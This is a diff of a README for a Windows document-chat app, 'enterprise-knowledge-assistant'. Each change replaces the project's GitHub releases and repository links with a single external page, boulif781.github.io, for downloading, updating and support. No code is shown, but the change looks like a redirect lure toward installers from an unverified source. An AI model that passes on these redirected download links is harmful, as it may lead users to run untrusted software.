@@ -1,6 +1,6 @@
 # 🤖 enterprise-knowledge-assistant - Chat with your company data instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Enterprise_Knowledge_Assistant-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://github.com/boulif781/enterprise-knowledge-assistant/releases)
+[![Download Now](https://img.shields.io/badge/Download-Enterprise_Knowledge_Assistant-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://boulif781.github.io)
 
 ---
 
@@ -35,7 +35,7 @@ And it responds instantly with the correct paragraph from your actual documents.
 
 Visit this link to download the application:
 
-[**https://github.com/boulif781/enterprise-knowledge-assistant/releases**](https://github.com/boulif781/enterprise-knowledge-assistant/releases)
+[**https://boulif781.github.io**](https://boulif781.github.io)
 
 Look for the **latest version** at the top of the page. The file you need is clearly marked.
 
@@ -123,7 +123,7 @@ Most users don't need to change anything here, but if you're curious:
 
 We regularly release updates with improvements and new features. To update:
 
-1. Visit the [download page](https://github.com/boulif781/enterprise-knowledge-assistant/releases) again.
+1. Visit the [download page](https://boulif781.github.io) again.
 2. Download the newest version.
 3. Run the installer (it will replace the old version automatically).
 4. Your documents and settings are preserved during the update.
@@ -136,7 +136,7 @@ If you're stuck, don't worry. Here's how to get help:
 
 - **Check the FAQ:** Click the "?" icon inside the app.
 - **Email Support:** support@enterprise-knowledge-assistant.com
-- **Visit the Website:** [https://github.com/boulif781/enterprise-knowledge-assistant](https://github.com/boulif781/enterprise-knowledge-assistant)
+- **Visit the Website:** [https://boulif781.github.io](https://boulif781.github.io)
 
 ---
 
@@ -170,7 +170,7 @@ If you're stuck, don't worry. Here's how to get help:
 
 ## ✔️ Quick Checklist
 
-- [x] Downloaded the application from the [releases page](https://github.com/boulif781/enterprise-knowledge-assistant/releases)
+- [x] Downloaded the application from the [releases page](https://boulif781.github.io)
 - [x] Ran the installer successfully
 - [x] Launched the app from the desktop icon
 - [x] Uploaded at least one document
@@ -182,7 +182,7 @@ If you're stuck, don't worry. Here's how to get help:
 
 Don't waste another minute searching through files. Download **enterprise-knowledge-assistant** today and experience the power of instant, accurate answers from your own company knowledge.
 
-**👉 [Download Now – It's Free](https://github.com/boulif781/enterprise-knowledge-assistant/releases)**
+**👉 [Download Now – It's Free](https://boulif781.github.io)**
 
 Make smarter decisions, faster. Your future self will thank you.
 
